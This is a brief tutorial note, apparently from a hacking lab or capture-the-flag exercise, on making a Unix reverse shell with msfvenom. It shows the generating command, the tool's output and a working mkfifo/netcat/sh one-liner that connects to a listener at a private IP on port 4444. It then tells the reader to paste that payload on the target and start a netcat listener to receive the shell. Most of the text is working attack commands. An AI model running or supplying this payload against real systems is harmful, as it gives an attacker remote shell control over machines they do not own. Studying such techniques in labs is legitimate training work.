
- First use the command on the local computer :
	(Ex: To create A reverse Shell on port 4444)
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=10.10.186.60 lport=4444 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 103 bytes
mkfifo /tmp/wqlcxyz; nc 10.100.186.60 4444 0</tmp/wqlcxyz | /bin/sh >/tmp/wqlcxyz 2>&1; rm /tmp/wqlcxyz
```

```bash
-p = payload
lhost = our local host IP address (this is your machine IP address)
lport = the port to listen on (this is the port on **your** machine)
R = export the payload in raw format
```


- Copy the payload :
```mkfifo /tmp/wqlcxyz; nc 10.100.186.60 4444 0</tmp/wqlcxyz | /bin/sh >/tmp/wqlcxyz 2>&1; rm /tmp/wqlcxyz```
- And Paste it on the Target
- Run an Netcat instance before to receive the connection

